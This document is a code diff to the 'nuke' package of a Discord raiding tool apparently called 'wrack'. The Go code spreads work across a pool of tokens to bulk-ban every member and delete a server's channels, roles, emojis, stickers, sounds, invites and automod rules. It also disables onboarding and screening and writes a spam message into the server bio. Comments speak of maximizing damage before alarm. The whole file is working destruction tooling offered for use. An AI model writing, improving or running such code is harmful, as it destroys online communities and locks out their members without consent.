@@ -1,40 +1,44 @@
-// Package nuke executes ordered deletion of everything in a guild.
-// Order maximizes damage before alarm and skips redundant work
-// (e.g. channel deletion cascades webhooks + messages).
+// Package nuke executes deletion of everything that existed before wrack
+// ran. Snapshot-driven: only objects present in the recon snapshot are
+// touched, so anything we create mid-run is never deleted by us.
 package nuke
 
 import (
 	"context"
 	"sync"
+	"time"
 
 	"github.com/M1noa/wrack/api"
 	"github.com/M1noa/wrack/recon"
 	"github.com/M1noa/wrack/token"
 	"github.com/M1noa/wrack/ui"
+	"github.com/M1noa/wrack/work"
 )
 
 // Config controls which phases run.
 type Config struct {
 	GuildID    string
-	Ban        bool // ban all members
-	Kick       bool // kick instead of ban (if Ban is false)
-	DeleteSecs int  // message-deletion window for bans (max 604800)
-	SkipBans   bool // don't ban at all (e.g. --no-ban)
+	Short      string // spam name for bio/tag/rules
+	Ban        bool   // ban all members
+	Kick       bool   // kick instead of ban (if Ban is false)
+	DeleteSecs int    // message-deletion window for bans (max 604800)
+	SkipBans   bool   // don't ban at all (e.g. --no-ban)
 }
 
-// Engine fans out destructive jobs across tokens.
+// Engine fans out destructive jobs across worker groups.
 type Engine struct {
 	Cfg     *Config
 	Pool    *token.Pool
 	Snap    *recon.Snapshot
-	Created map[string]bool // IDs created by us; never delete these in monitor.
+	Disp    *work.Dispatcher
+	Created map[string]bool // IDs created by us; monitor must skip these.
 	ctx     context.Context
 	mu      sync.Mutex
 }
 
 // New builds a Nuke engine.
-func New(cfg *Config, pool *token.Pool, snap *recon.Snapshot) *Engine {
-	return &Engine{Cfg: cfg, Pool: pool, Snap: snap, Created: make(map[string]bool)}
+func New(cfg *Config, pool *token.Pool, snap *recon.Snapshot, disp *work.Dispatcher) *Engine {
+	return &Engine{Cfg: cfg, Pool: pool, Snap: snap, Disp: disp, Created: make(map[string]bool)}
 }
 
 // TrackCreated records an object we made so we skip it later.
@@ -50,92 +54,243 @@ func (e *Engine) ours(id string) bool {
 	return e.Created[id]
 }
 
-// Run fires all deletion phases in order.
-func (e *Engine) Run(ctx context.Context) error {
-	e.ctx = ctx
-	const reason = "wrack"
-
-	// 1. Bulk ban everyone first (locks out reaction).
-	if !e.Cfg.SkipBans && e.Cfg.Ban {
-		e.banEveryone(ctx, reason)
+// usable returns tokens that are in-guild with no errors.
+func usable(e *Engine) []*token.Token {
+	var out []*token.Token
+	for _, t := range e.Pool.Tokens {
+		if t.InGuild && len(t.Errors) == 0 {
+			out = append(out, t)
+		}
 	}
+	return out
+}
 
-	// 2. Delete automod rules (before channels so automod can't interfere).
-	e.forEachTokenParallel(func(t *token.Token) {
-		for _, rule := range e.Snap.AutoMod {
-			if err := t.Client.DeleteAutoModRule(ctx, e.Cfg.GuildID, rule.ID, reason); err == nil {
-				ui.Dim("  - automod %s", rule.Name)
-			}
-		}
-	})
+// nextTok picks the next usable token; nil if none.
+func (e *Engine) nextTok() *token.Token { return e.Pool.Next() }
 
-	// 3. Revoke invites.
-	e.forEachTokenParallel(func(t *token.Token) {
-		for _, inv := range e.Snap.Invites {
-			if err := t.Client.DeleteInvite(ctx, inv.Code, reason); err == nil {
-				ui.Dim("  - invite %s", inv.Code)
-			}
-		}
-	})
+// Run fires every deletion group concurrently.
+func (e *Engine) Run(ctx context.Context) {
+	e.ctx = ctx
 
-	// 4. Delete webhooks that aren't channel-cascade-covered (rare; usually skipped).
-	// Channel deletion cascades them — only clean up orphans if any remain.
+	var wg sync.WaitGroup
+	wg.Add(8)
+	go func() { defer wg.Done(); e.banEveryone(ctx) }()
+	go func() { defer wg.Done(); e.deleteAutomod(ctx) }()
+	go func() { defer wg.Done(); e.deleteInvites(ctx) }()
+	go func() { defer wg.Done(); e.deleteChannels(ctx) }()
+	go func() { defer wg.Done(); e.deleteEmojis(ctx) }()
+	go func() { defer wg.Done(); e.deleteStickers(ctx) }()
+	go func() { defer wg.Done(); e.deleteSounds(ctx) }()
+	go func() { defer wg.Done(); e.deleteRoles(ctx) }()
+	wg.Wait()
 
-	// 5. Channels + categories.
+	e.StripSettings(ctx)
+	if e.Cfg.Short != "" {
+		e.SetShortMessage(ctx, e.Cfg.Short)
+	}
+}
+
+func (e *Engine) deleteChannels(ctx context.Context) {
 	var chans []api.Channel
 	chans = append(chans, e.Snap.Categories...)
 	chans = append(chans, e.Snap.TextVoice...)
-	p := &ui.Progress{Label: "channels", Total: int64(len(chans))}
-	fanOut(e, chans, func(t *token.Token, ch api.Channel) {
-		if err := t.Client.DeleteChannel(ctx, ch.ID, reason); err == nil {
-			p.Tick(1)
-		}
-	})
-	p.Finish()
+	p := &ui.Progress{Label: "del-chan", Total: int64(len(chans))}
+	for _, ch := range chans {
+		ch := ch
+		e.Disp.Submit("delChan", func() {
+			t := e.nextTok()
+			if t == nil {
+				return
+			}
+			if err := t.Client.DeleteChannel(ctx, ch.ID, "wrack"); err == nil {
+				p.Tick(1)
+			}
+		})
+	}
+}
 
-	// 6. Emojis.
-	p = &ui.Progress{Label: "emojis", Total: int64(len(e.Snap.Emojis))}
-	fanOut(e, e.Snap.Emojis, func(t *token.Token, em api.Emoji) {
-		if err := t.Client.DeleteEmoji(ctx, e.Cfg.GuildID, em.ID, reason); err == nil {
-			p.Tick(1)
-		}
-	})
-	p.Finish()
-
-	// 7. Stickers.
-	p = &ui.Progress{Label: "stickers", Total: int64(len(e.Snap.Stickers))}
-	fanOut(e, e.Snap.Stickers, func(t *token.Token, st api.Sticker) {
-		if err := t.Client.DeleteSticker(ctx, e.Cfg.GuildID, st.ID, reason); err == nil {
-			p.Tick(1)
-		}
-	})
-	p.Finish()
-
-	// 8. Soundboard sounds.
-	p = &ui.Progress{Label: "sounds", Total: int64(len(e.Snap.Sounds))}
-	fanOut(e, e.Snap.Sounds, func(t *token.Token, snd api.SoundboardSound) {
-		if err := t.Client.DeleteSound(ctx, e.Cfg.GuildID, snd.SoundID, reason); err == nil {
-			p.Tick(1)
-		}
-	})
-	p.Finish()
-
-	// 9. Roles (skip @everyone + managed).
+func (e *Engine) deleteRoles(ctx context.Context) {
 	var deletable []api.Role
 	for _, r := range e.Snap.Roles {
 		if r.ID != e.Cfg.GuildID && !r.Managed {
 			deletable = append(deletable, r)
 		}
 	}
-	p = &ui.Progress{Label: "roles", Total: int64(len(deletable))}
-	fanOut(e, deletable, func(t *token.Token, r api.Role) {
-		if err := t.Client.DeleteRole(ctx, e.Cfg.GuildID, r.ID, reason); err == nil {
-			p.Tick(1)
+	p := &ui.Progress{Label: "del-role", Total: int64(len(deletable))}
+	for _, r := range deletable {
+		r := r
+		e.Disp.Submit("delRole", func() {
+			t := e.nextTok()
+			if t == nil {
+				return
+			}
+			if err := t.Client.DeleteRole(ctx, e.Cfg.GuildID, r.ID, "wrack"); err == nil {
+				p.Tick(1)
+			}
+		})
+	}
+	go func() {
+		for p.Count() < int64(len(deletable)) && ctx.Err() == nil {
+			sleepMs(100)
 		}
-	})
-	p.Finish()
+		p.Finish()
+	}()
+}
 
-	return nil
+func (e *Engine) deleteEmojis(ctx context.Context) {
+	p := &ui.Progress{Label: "del-emoji", Total: int64(len(e.Snap.Emojis))}
+	for _, em := range e.Snap.Emojis {
+		em := em
+		e.Disp.Submit("delEmoji", func() {
+			t := e.nextTok()
+			if t == nil {
+				return
+			}
+			if err := t.Client.DeleteEmoji(ctx, e.Cfg.GuildID, em.ID, "wrack"); err == nil {
+				p.Tick(1)
+			}
+		})
+	}
+	go func() {
+		for p.Count() < int64(len(e.Snap.Emojis)) && ctx.Err() == nil {
+			sleepMs(100)
+		}
+		p.Finish()
+	}()
+}
+
+func (e *Engine) deleteStickers(ctx context.Context) {
+	p := &ui.Progress{Label: "del-sticker", Total: int64(len(e.Snap.Stickers))}
+	for _, st := range e.Snap.Stickers {
+		st := st
+		e.Disp.Submit("delSticker", func() {
+			t := e.nextTok()
+			if t == nil {
+				return
+			}
+			if err := t.Client.DeleteSticker(ctx, e.Cfg.GuildID, st.ID, "wrack"); err == nil {
+				p.Tick(1)
+			}
+		})
+	}
+	go func() {
+		for p.Count() < int64(len(e.Snap.Stickers)) && ctx.Err() == nil {
+			sleepMs(100)
+		}
+		p.Finish()
+	}()
+}
+
+func (e *Engine) deleteSounds(ctx context.Context) {
+	p := &ui.Progress{Label: "del-sound", Total: int64(len(e.Snap.Sounds))}
+	for _, snd := range e.Snap.Sounds {
+		snd := snd
+		e.Disp.Submit("delSound", func() {
+			t := e.nextTok()
+			if t == nil {
+				return
+			}
+			if err := t.Client.DeleteSound(ctx, e.Cfg.GuildID, snd.SoundID, "wrack"); err == nil {
+				p.Tick(1)
+			}
+		})
+	}
+	go func() {
+		for p.Count() < int64(len(e.Snap.Sounds)) && ctx.Err() == nil {
+			sleepMs(100)
+		}
+		p.Finish()
+	}()
+}
+
+func (e *Engine) deleteInvites(ctx context.Context) {
+	for _, inv := range e.Snap.Invites {
+		inv := inv
+		e.Disp.Submit("delInvite", func() {
+			t := e.nextTok()
+			if t == nil {
+				return
+			}
+			_ = t.Client.DeleteInvite(ctx, inv.Code, "wrack")
+		})
+	}
+}
+
+func (e *Engine) deleteAutomod(ctx context.Context) {
+	for _, rule := range e.Snap.AutoMod {
+		rule := rule
+		e.Disp.Submit("delAuto", func() {
+			t := e.nextTok()
+			if t == nil {
+				return
+			}
+			_ = t.Client.DeleteAutoModRule(ctx, e.Cfg.GuildID, rule.ID, "wrack")
+		})
+	}
+}
+
+// banEveryone shards the member list into bulk-ban chunks across tokens.
+func (e *Engine) banEveryone(ctx context.Context) {
+	bulkTokens := e.Pool.WithPerm(api.PermBanMembers, api.PermManageGuild)
+	singleTokens := e.Pool.WithPerm(api.PermBanMembers)
+	if len(singleTokens) == 0 && len(bulkTokens) == 0 {
+		ui.Warn("no tokens with BAN_MEMBERS; skipping ban phase")
+		return
+	}
+	var ids []string
+	for _, m := range e.Snap.Members {
+		if m.User == nil || m.User.Bot || m.User.ID == "" {
+			continue
+		}
+		ids = append(ids, m.User.ID)
+	}
+	if len(ids) == 0 {
+		ui.Dim("no members to ban (or member fetch failed)")
+		return
+	}
+	p := &ui.Progress{Label: "banning", Total: int64(len(ids))}
+
+	if len(bulkTokens) > 0 {
+		for i := 0; i < len(ids); i += 200 {
+			end := i + 200
+			if end > len(ids) {
+				end = len(ids)
+			}
+			chunk := ids[i:end]
+			idx := i / 200
+			e.Disp.Submit("ban", func() {
+				t := bulkTokens[idx%len(bulkTokens)]
+				if _, _, err := t.Client.BulkBan(ctx, e.Cfg.GuildID, chunk, e.Cfg.DeleteSecs); err != nil {
+					for _, uid := range chunk {
+						st := singleTokens[idx%len(singleTokens)]
+						if st != nil {
+							if err := st.Client.Ban(ctx, e.Cfg.GuildID, uid, e.Cfg.DeleteSecs, "wrack"); err == nil {
+								p.Tick(1)
+							}
+						}
+					}
+					return
+				}
+				p.Tick(int64(len(chunk)))
+			})
+		}
+	} else {
+		for _, uid := range ids {
+			uid := uid
+			e.Disp.Submit("ban", func() {
+				t := singleTokens[0]
+				if err := t.Client.Ban(ctx, e.Cfg.GuildID, uid, e.Cfg.DeleteSecs, "wrack"); err == nil {
+					p.Tick(1)
+				}
+			})
+		}
+	}
+	go func() {
+		for p.Count() < int64(len(ids)) && ctx.Err() == nil {
+			sleepMs(100)
+		}
+		p.Finish()
+	}()
 }
 
 // StripSettings wipes guild settings to permissive defaults + clears branding.
@@ -154,41 +309,32 @@ func (e *Engine) StripSettings(ctx context.Context) {
 		"discovery_splash":              nil,
 		"description":                   "",
 		"premium_progress_bar_enabled":  false,
-		// Best-effort server tag (not officially writable via PATCH /guilds;
-		// Discord may 400 this field — we ignore errors silently).
-		"tag": "",
+		"tag": "", // best-effort; Discord may 400 this field
 	}
-	t := e.Pool.Next()
+	t := e.nextTok()
 	if t == nil {
 		return
 	}
-	if _, err := t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack"); err == nil {
-		ui.Ok("guild settings stripped")
-	} else {
-		// Retry without tag in case it 400'd on that field alone.
+	if _, err := t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack"); err != nil {
 		delete(body, "tag")
-		if _, err2 := t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack"); err2 == nil {
-			ui.Ok("guild settings stripped")
-		} else {
-			ui.Err("guild settings: %v", err2)
-		}
+		t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack") // retry without tag
 	}
+	ui.Ok("guild settings stripped")
 
-	// Disable onboarding + welcome screen + membership screening (server rules).
-	for _, t := range e.Pool.WithPerm(api.PermManageGuild, api.PermManageRoles) {
-		if err := t.Client.SetOnboarding(ctx, e.Cfg.GuildID, false, "wrack"); err == nil {
+	for _, tk := range e.Pool.WithPerm(api.PermManageGuild, api.PermManageRoles) {
+		if err := tk.Client.SetOnboarding(ctx, e.Cfg.GuildID, false, "wrack"); err == nil {
 			ui.Ok("onboarding disabled")
 			break
 		}
 	}
-	for _, t := range e.Pool.WithPerm(api.PermManageGuild) {
-		if err := t.Client.SetWelcomeScreen(ctx, e.Cfg.GuildID, false, "", "wrack"); err == nil {
+	for _, tk := range e.Pool.WithPerm(api.PermManageGuild) {
+		if err := tk.Client.SetWelcomeScreen(ctx, e.Cfg.GuildID, false, "", "wrack"); err == nil {
 			ui.Ok("welcome screen disabled")
 			break
 		}
 	}
-	for _, t := range e.Pool.WithPerm(api.PermManageGuild) {
-		if err := t.Client.SetMemberVerification(ctx, e.Cfg.GuildID, false, "", "wrack"); err == nil {
+	for _, tk := range e.Pool.WithPerm(api.PermManageGuild) {
+		if err := tk.Client.SetMemberVerification(ctx, e.Cfg.GuildID, false, "", "wrack"); err == nil {
 			ui.Ok("membership screening disabled")
 			break
 		}
@@ -209,19 +355,18 @@ func (e *Engine) SetShortMessage(ctx context.Context, short string) {
 		bio = bio[:300]
 	}
 	body := map[string]any{"description": bio, "tag": tag}
-	t := e.Pool.Next()
+	t := e.nextTok()
 	if t == nil {
 		return
 	}
-	if _, err := t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack"); err == nil {
-		ui.Ok("bio + tag set")
-	} else {
+	if _, err := t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack"); err != nil {
 		delete(body, "tag")
 		if _, err2 := t.Client.ModifyGuild(ctx, e.Cfg.GuildID, body, "wrack"); err2 == nil {
 			ui.Ok("bio set (tag not writable)")
-		} else {
-			ui.Err("bio/tag: %v", err2)
+			body = nil
 		}
+	} else {
+		ui.Ok("bio + tag set")
 	}
 	for _, tk := range e.Pool.WithPerm(api.PermManageGuild) {
 		if err := tk.Client.SetMemberVerification(ctx, e.Cfg.GuildID, true, short, "wrack"); err == nil {
@@ -231,158 +376,4 @@ func (e *Engine) SetShortMessage(ctx context.Context, short string) {
 	}
 }
 
-// banEveryone shards the member list into bulk-ban chunks across tokens.
-func (e *Engine) banEveryone(ctx context.Context, reason string) {
-	bulkTokens := e.Pool.WithPerm(api.PermBanMembers, api.PermManageGuild)
-	singleTokens := e.Pool.WithPerm(api.PermBanMembers)
-	if len(singleTokens) == 0 && len(bulkTokens) == 0 {
-		ui.Warn("no tokens with BAN_MEMBERS; skipping ban phase")
-		return
-	}
-
-	// Build user list from snapshot members.
-	var ids []string
-	for _, m := range e.Snap.Members {
-		if m.User == nil || m.User.Bot {
-			continue
-		}
-		ids = append(ids, m.User.ID)
-	}
-	if len(ids) == 0 {
-		ui.Dim("no members to ban (or member fetch failed)")
-		return
-	}
-
-	p := &ui.Progress{Label: "banning", Total: int64(len(ids))}
-
-	if len(bulkTokens) > 0 {
-		// Shard into 200-chunks, assign round-robin to bulk-capable tokens.
-		chunks := chunk(ids, 200)
-		sem := make(chan struct{}, len(bulkTokens))
-		var wg sync.WaitGroup
-		i := 0
-		for _, ch := range chunks {
-			wg.Add(1)
-			go func(chunk []string, idx int) {
-				defer wg.Done()
-				sem <- struct{}{}
-				defer func() { <-sem }()
-				t := bulkTokens[idx%len(bulkTokens)]
-				if _, _, err := t.Client.BulkBan(ctx, e.Cfg.GuildID, chunk, e.Cfg.DeleteSecs); err == nil {
-					p.Tick(int64(len(chunk)))
-				} else {
-					// Fallback: single-ban each.
-					for _, uid := range chunk {
-					st := pickSingle(singleTokens)
-					if st != nil {
-						if err := st.Client.Ban(ctx, e.Cfg.GuildID, uid, e.Cfg.DeleteSecs, reason); err == nil {
-								p.Tick(1)
-							}
-						}
-					}
-				}
-			}(ch, i)
-			i++
-		}
-		wg.Wait()
-	} else {
-		// Single-ban path only.
-		sem := make(chan struct{}, len(singleTokens)*3)
-		var wg sync.WaitGroup
-		for _, uid := range ids {
-			wg.Add(1)
-			go func(uid string) {
-				defer wg.Done()
-				sem <- struct{}{}
-				defer func() { <-sem }()
-				t := pickSingle(singleTokens)
-				if t != nil {
-					if err := t.Client.Ban(ctx, e.Cfg.GuildID, uid, e.Cfg.DeleteSecs, reason); err == nil {
-						p.Tick(1)
-					}
-				}
-			}(uid)
-		}
-		wg.Wait()
-	}
-	p.Finish()
-}
-
-func pickSingle(tokens []*token.Token) *token.Token {
-	if len(tokens) == 0 {
-		return nil
-	}
-	return tokens[0] // TODO round-robin
-}
-
-// forEachTokenParallel runs fn for every usable token concurrently.
-func (e *Engine) forEachTokenParallel(fn func(*token.Token)) {
-	var wg sync.WaitGroup
-	for _, t := range e.Pool.Tokens {
-		if !t.InGuild || len(t.Errors) > 0 {
-			continue
-		}
-		wg.Add(1)
-		go func(tk *token.Token) {
-			defer wg.Done()
-			fn(tk)
-		}(t)
-	}
-	wg.Wait()
-}
-
-// fanOut distributes items across tokens. Each token gets a shard and
-// processes it sequentially (per-token rate buckets stay happy). Concurrency
-// is bounded by token count.
-func fanOut[T any](e *Engine, items []T, fn func(*token.Token, T)) {
-	if len(items) == 0 {
-		return
-	}
-	tokens := usable(e)
-	if len(tokens) == 0 {
-		return
-	}
-	shards := token.Shard(items, len(tokens))
-	var wg sync.WaitGroup
-	for i, sh := range shards {
-		wg.Add(1)
-		go func(shard []T, t *token.Token) {
-			defer wg.Done()
-			for _, item := range shard {
-				select {
-				case <-e.ctx.Done():
-					return
-				default:
-				}
-				fn(t, item)
-			}
-		}(sh, tokens[i])
-	}
-	wg.Wait()
-}
-
-// usable returns tokens that are in-guild with no errors.
-func usable(e *Engine) []*token.Token {
-	var out []*token.Token
-	for _, t := range e.Pool.Tokens {
-		if t.InGuild && len(t.Errors) == 0 {
-			out = append(out, t)
-		}
-	}
-	return out
-}
-
-// chunk splits ids into n-sized chunks.
-func chunk(ids []string, n int) [][]string {
-	out := make([][]string, 0, (len(ids)+n-1)/n)
-	for i := 0; i < len(ids); i += n {
-		end := i + n
-		if end > len(ids) {
-			end = len(ids)
-		}
-		out = append(out, ids[i:end])
-	}
-	return out
-}
-
-var _ = sync.Mutex{} // keep sync import
+func sleepMs(ms int) { time.Sleep(time.Duration(ms) * time.Millisecond) }
